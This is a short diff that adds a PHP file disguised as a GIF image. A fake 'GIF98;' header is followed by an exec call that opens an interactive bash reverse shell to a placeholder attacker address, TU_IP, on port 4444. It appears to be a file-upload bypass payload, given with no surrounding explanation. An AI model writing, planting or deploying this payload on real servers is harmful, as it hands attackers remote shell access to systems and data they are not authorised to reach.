@@ -1,0 +1,4 @@
+GIF98;
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'");
+?>
